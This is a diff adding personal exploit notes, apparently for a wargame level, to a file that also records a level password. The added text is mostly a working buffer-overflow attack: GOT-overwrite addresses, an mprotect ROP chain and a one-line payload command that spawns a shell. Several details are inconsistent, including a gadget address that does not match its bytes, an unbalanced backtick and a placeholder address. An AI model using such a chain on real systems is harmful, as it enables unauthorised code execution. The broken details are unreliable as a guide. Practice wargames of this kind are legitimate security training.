@@ -97,3 +97,63 @@
 	id: dark_stone
 	pw: let there be light
 </next>
+
+<with fake ebp>
+	<strcpy plt>
+		0x8048438
+		\x38\x84\x04\x08
+	</strcpy plt>
+
+	<printf plt>
+		0x8048408
+		\x08\x84\x04\x08
+	</printf plt>
+
+	<printf got>
+		0x804984c
+		\x4c\x98\x04\x08
+	</printf got>
+
+	<mprotect>
+		0x714670
+		<got overwrite>
+			0x70: 0x80482a6 \xa6\x82\x04\x08
+			0x46: 0x8048678 \x78\x86\x04\x08
+			0x71: 0x??????? \x??\x??\x??\x??
+			0x00: 0x8048711 \x11\x87\x04\x08
+		</got overwrite>
+
+		<argument>
+			arg1: 0xf6fff000 \x00\xf0\xff\xf6
+			arg2: 0x1000 \x00\x10\x00\x00
+			arg3: 0x7 \x00\x00\x00\x07
+		</argument>
+	</mprotect>
+
+	<location of mprotect>
+		0xf6fff004
+	</location of mprotect>
+
+	<stdout buffer>
+		0xf6fff000
+		0xf6fff004 บฮลอ
+	</stdout buffer>
+	
+	<leave, ret>
+		0x8048634
+	</leave, ret>
+
+	<pop_pop_ret>
+		0x80484f1
+		\xf3\x84\x04\x08
+	</pop_pop_ret>
+
+	<command>
+		printf "$(for x in `seq 1 268; do printf "a"; done)\x34\x86\x04\x08$(for x in `seq 1 88`; do printf "a"; done)\x6c\xf1\xff\xf6\x34\x86\x04\x08
+\x38\x84\x04\x08\xf3\x84\x04\x08\x4c\x98\x04\x08\xa6\x82\x04\x08
+\x38\x84\x04\x08\xf3\x84\x04\x08\x4d\x98\x04\x08\x78\x86\x04\x08
+\x38\x84\x04\x08\xf3\x84\x04\x08\x4e\x98\x04\x08\xc4\xf1\xff\xf6
+\x38\x84\x04\x08\xf3\x84\x04\x08\x4f\x98\x04\x08\x11\x87\x04\x08
+\x08\x84\x04\x08\xca\xf1\xff\xf6\x00\xf0\xff\xf6\x00\x10\x00\x00\x00\x00\x00\x07\x71\x00\x03\x36\x83\x00shell"
+	</command>
+</with fake ebp>
